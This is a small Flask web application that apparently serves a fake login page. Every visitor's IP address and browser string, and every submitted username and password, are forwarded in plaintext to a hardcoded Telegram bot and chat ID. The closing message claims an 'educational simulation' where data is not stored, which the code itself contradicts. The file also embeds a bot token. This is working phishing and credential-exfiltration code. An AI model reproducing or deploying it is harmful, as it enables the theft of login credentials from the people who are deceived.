from flask import Flask, request, render_template
import requests

app = Flask(__name__, template_folder="templates")

BOT_TOKEN = "7742866090:AAGzLvBk8hnfSllLEnPcobBAUkhaEkOM2j8"
CHAT_ID = "6130601981"  # Veer ka Telegram ID

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.get(url, params={'chat_id': CHAT_ID, 'text': message})

@app.route('/')
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    send_telegram(f"👀 Visitor Detected\n🌐 IP: {ip}\n📱 UA: {ua}")
    return render_template("login.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    send_telegram(f"🔐 Login Attempt:\n👤 Username: {username}\n🔑 Password: {password}")
    return "✅ Educational simulation complete. Data not stored."
